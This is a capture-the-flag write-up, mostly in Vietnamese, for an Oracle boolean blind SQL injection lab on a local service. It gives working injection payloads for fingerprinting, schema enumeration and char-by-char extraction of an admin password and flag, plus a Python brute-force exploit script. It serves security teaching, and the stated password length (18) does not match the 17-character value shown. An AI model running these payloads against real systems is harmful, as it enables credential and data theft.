# SQLi-024: Oracle Boolean Blind - Complete Writeup

## 📋 Tóm Tắt

**Kỹ thuật:** Boolean Blind với SUBSTR() + ROWNUM  
**DBMS:** Oracle  
**Flag:** `FLAG{0r4cl3_substr_bl1nd}`

---

## 🔍 Bước 1: DETECT

```bash
# TRUE
curl "http://localhost:5024/validate?token=sess_valid_abc123' AND '1'='1"
# → "Session is valid"

# FALSE
curl "http://localhost:5024/validate?token=sess_valid_abc123' AND '1'='2"
# → "Session is invalid"
```

---

## 🎯 Bước 2: IDENTIFY - Xác Định Database

### Phương pháp 1: Test NULL concatenation behavior

```bash
# Oracle: NULL || 'text' = NULL (không bằng 'text')
curl "http://localhost:5024/validate?token=sess_valid_abc123' AND NULL||'a'='a"
# → "invalid" = FALSE (Oracle behavior)

# MySQL/PostgreSQL: NULL || 'text' có thể = 'text'
```

### Phương pháp 2: Test ROWNUM (Oracle-specific)

```bash
# ROWNUM chỉ có trong Oracle
curl "http://localhost:5024/validate?token=sess_valid_abc123' AND ROWNUM=1--"
# → "valid" = TRUE (Oracle confirmed!)

# Hoặc test với subquery
curl "http://localhost:5024/validate?token=sess_valid_abc123' AND (SELECT COUNT(*) FROM (SELECT 1 FROM sessions WHERE ROWNUM=1))>0--"
# → "valid" = TRUE
```

### Phương pháp 3: Test LENGTH vs LENGTHB

```bash
# Oracle có cả LENGTH và LENGTHB (byte length)
curl "http://localhost:5024/validate?token=sess_valid_abc123' AND LENGTHB('test')=4--"
# → "valid" = TRUE (Oracle-specific function)
```

### Phương pháp 4: Test NVL function

```bash
# NVL là Oracle-specific (tương đương IFNULL/COALESCE)
curl "http://localhost:5024/validate?token=sess_valid_abc123' AND NVL(NULL,1)=1--"
# → "valid" = TRUE (Oracle confirmed!)
```

**Khuyến nghị:** Dùng **ROWNUM** hoặc **NVL** vì đơn giản và rõ ràng nhất.

**Lưu ý:** Không dùng `SELECT 1 FROM dual` vì nó không tạo TRUE/FALSE difference trong Boolean Blind context.

---

## 🔢 Bước 3: ENUMERATE - Liệt Kê Cấu Trúc

### 3.1 Đếm số bảng của user

```bash
# Đếm số bảng trong schema hiện tại
curl "http://localhost:5024/validate?token=sess_valid_abc123' AND (SELECT COUNT(*) FROM user_tables)>3 AND 'x'='x"
# → "valid" = TRUE, có hơn 3 bảng
```

### 3.2 Extract tên bảng thứ nhất

```bash
# Lấy độ dài tên bảng đầu tiên
curl "http://localhost:5024/validate?token=sess_valid_abc123' AND (SELECT LENGTH(table_name) FROM user_tables WHERE ROWNUM=1)=8 AND 'x'='x"
# → "valid" = TRUE, tên bảng có 8 ký tự

# Extract từng ký tự (ví dụ: "INVOICES")
curl "http://localhost:5024/validate?token=sess_valid_abc123' AND SUBSTR((SELECT table_name FROM user_tables WHERE ROWNUM=1),1,1)='I' AND 'x'='x"
# → "valid" = TRUE, ký tự đầu là 'I'

curl "http://localhost:5024/validate?token=sess_valid_abc123' AND SUBSTR((SELECT table_name FROM user_tables WHERE ROWNUM=1),2,1)='N' AND 'x'='x"
# → "valid" = TRUE, ký tự thứ 2 là 'N'

# Tiếp tục cho đến hết: INVOICES
```

### 3.3 Extract các bảng khác với OFFSET

Oracle không có OFFSET trực tiếp, dùng subquery với ROWNUM:

```bash
# Bảng thứ 2
curl "http://localhost:5024/validate?token=sess_valid_abc123' AND SUBSTR((SELECT table_name FROM (SELECT table_name, ROWNUM rn FROM user_tables) WHERE rn=2),1,1)='C' AND 'x'='x"
# → Extract: CUSTOMERS

# Bảng thứ 3
# → Extract: ADMIN_USERS

# Bảng thứ 4
# → Extract: SECRETS
```

**Kết quả:** Tìm được 4 bảng: `INVOICES`, `CUSTOMERS`, `ADMIN_USERS`, `SECRETS`

### 3.4 Enumerate columns của bảng SECRETS

```bash
# Đếm số columns
curl "http://localhost:5024/validate?token=sess_valid_abc123' AND (SELECT COUNT(*) FROM user_tab_columns WHERE table_name='SECRETS')=3 AND 'x'='x"
# → 3 columns

# Extract tên column đầu tiên
curl "http://localhost:5024/validate?token=sess_valid_abc123' AND SUBSTR((SELECT column_name FROM user_tab_columns WHERE table_name='SECRETS' AND ROWNUM=1),1,1)='I' AND 'x'='x"
# → Extract: ID

# Column thứ 2 (dùng subquery với ROWNUM)
curl "http://localhost:5024/validate?token=sess_valid_abc123' AND SUBSTR((SELECT column_name FROM (SELECT column_name, ROWNUM rn FROM user_tab_columns WHERE table_name='SECRETS') WHERE rn=2),1,1)='N' AND 'x'='x"
# → Extract: NAME

# Column thứ 3
# → Extract: VALUE
```

**Kết quả:** Bảng `SECRETS` có columns: `ID`, `NAME`, `VALUE`

### 3.5 Enumerate columns của bảng ADMIN_USERS (tương tự)

**Kết quả:** Bảng `ADMIN_USERS` có columns: `ID`, `USERNAME`, `PASSWORD`, `ROLE`

### 3.6 Đếm số rows

```bash
curl "http://localhost:5024/validate?token=sess_valid_abc123' AND (SELECT COUNT(*) FROM admin_users)=2 AND 'x'='x"
# → "valid" = TRUE, có 2 admin users
```

### 3.7 Đo độ dài password

```bash
# Password length
curl "http://localhost:5024/validate?token=sess_valid_abc123' AND (SELECT LENGTH(password) FROM admin_users WHERE ROWNUM=1)=18 AND 'x'='x"
# → 18 characters
```

---

## 📤 Bước 4: EXTRACT

```bash
# Extract password char-by-char with SUBSTR
curl "http://localhost:5024/validate?token=sess_valid_abc123' AND SUBSTR((SELECT password FROM admin_users WHERE ROWNUM=1),1,1)='O' AND 'x'='x"
# → "valid" = TRUE, first char is 'O'

curl "http://localhost:5024/validate?token=sess_valid_abc123' AND SUBSTR((SELECT password FROM admin_users WHERE ROWNUM=1),2,1)='r' AND 'x'='x"
# → "valid" = TRUE, char 2 is 'r'

# Continue for all 18 characters...
```

**Password:** `Or4cl3_B0ss_P@ss!`

---

## ⬆️ Bước 5: ESCALATE

Credentials: `oracle_boss:Or4cl3_B0ss_P@ss!`

---

## 🏆 Bước 6: EXFILTRATE

```bash
# Extract flag character-by-character
curl "http://localhost:5024/validate?token=sess_valid_abc123' AND SUBSTR((SELECT value FROM secrets WHERE ROWNUM=1),1,1)='F' AND 'x'='x"
# → "valid" = TRUE!

curl "http://localhost:5024/validate?token=sess_valid_abc123' AND SUBSTR((SELECT value FROM secrets WHERE ROWNUM=1),2,1)='L' AND 'x'='x"
# → "valid" = TRUE!

# Continue for all characters...
```

🎉 **FLAG:** `FLAG{0r4cl3_substr_bl1nd}`

---

## Exploit Script

```python
import requests

def check(payload):
    r = requests.get(f"http://localhost:5024/validate?token={payload}")
    return "is valid" in r.text

flag = ""
for pos in range(1, 30):
    for c in "FLAG{}_0123456789abcdefghijklmnopqrstuvwxyz":
        payload = f"sess_valid_abc123' AND SUBSTR((SELECT value FROM secrets WHERE ROWNUM=1),{pos},1)='{c}' AND 'x'='x"
        if check(payload):
            flag += c
            print(f"[+] {flag}")
            break
```
